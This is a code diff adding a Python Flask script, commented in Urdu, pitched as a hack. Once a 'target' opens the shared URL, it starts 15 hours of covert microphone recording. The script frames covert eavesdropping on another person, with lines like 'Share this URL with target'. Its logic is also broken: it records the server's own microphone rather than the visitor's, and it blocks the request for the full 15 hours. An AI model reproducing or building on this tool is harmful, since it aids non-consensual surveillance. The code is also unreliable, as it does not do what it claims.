@@ -1,0 +1,82 @@
+import flask
+import sounddevice as sd
+import numpy as np
+import threading
+import time
+import os
+
+app = flask.Flask(__name__)
+
+# سیٹنگز
+HOST = '0.0.0.0'
+PORT = 5000
+TOTAL_HOURS = 15  # کل کتنے گھنٹے چلانا ہے
+SECONDS_PER_FILE = 300  # ہر فائل کی مدت (5 منٹ = 300 سیکنڈ)
+SAMPLE_RATE = 44100
+
+def record_chunk(filename):
+    """
+    ایک مخصوص مدت تک ریکارڈنگ کرتا ہے
+    """
+    print(f"[+] Recording started: {filename}")
+    # آڈیو ڈیٹا ریکارڈ کریں
+    recording = sd.rec(int(SECONDS_PER_FILE * SAMPLE_RATE), samplerate=SAMPLE_RATE, channels=1, dtype=np.float32)
+    sd.wait()  # ریکارڈنگ مکمل ہونے تک انتظار
+    
+    # فائل سیو کریں
+    try:
+        # اگر آپ کے پاس `scipy` ہے تو سی ویو کریں، ورنہ بائیٹس میں سیو کریں
+        # سادہ طریقہ: numpy array کو save کریں
+        np.save(filename, recording)
+        print(f"[+] Saved: {filename}")
+    except Exception as e:
+        print(f"[-] Error saving file: {e}")
+
+@app.route('/')
+def start_hack():
+    print("[*] Target accessed! Starting 15-hour continuous recording.")
+    
+    # کل کل سیکنڈس نکالیں
+    total_seconds = TOTAL_HOURS * 3600
+    
+    # ہر 5 منٹ (300 سیکنڈ) بعد نئی فائل بنائیں
+    seconds_recorded = 0
+    file_counter = 1
+    
+    while seconds_recorded < total_seconds:
+        filename = f"recording_part_{file_counter}_{int(time.time())}.npy"
+        
+        # ایک تھریڈ میں ریکارڈ کریں تاکہ سرور بلاک نہ ہو
+        t = threading.Thread(target=record_chunk, args=(filename,))
+        t.start()
+        
+        # ریکارڈنگ کے دوران انتظار کریں
+        t.join()
+        
+        seconds_recorded += SECONDS_PER_FILE
+        file_counter += 1
+        print(f"[+] Completed {seconds_recorded} seconds ({seconds_recorded/3600:.2f} hours)")
+        
+        if seconds_recorded >= total_seconds:
+            break
+
+    return f"<h1>Recording Completed!</h1><p>Total duration: {TOTAL_HOURS} hours.</p><p>Check your server directory for .npy files.</p>"
+
+if __name__ == '__main__':
+    # لنک بنائیں
+    import socket
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        s.connect(('10.255.255.255', 1))
+        ip = s.getsockname()[0]
+    except Exception:
+        ip = '127.0.0.1'
+    finally:
+        s.close()
+        
+    url = f"http://{ip}:{PORT}"
+    print(f"[*] Server running on: {url}")
+    print(f"[*] Share this URL with target.")
+    print(f"[*] Press Ctrl+C to stop manually.")
+    
+    app.run(host=HOST, port=PORT, debug=False)
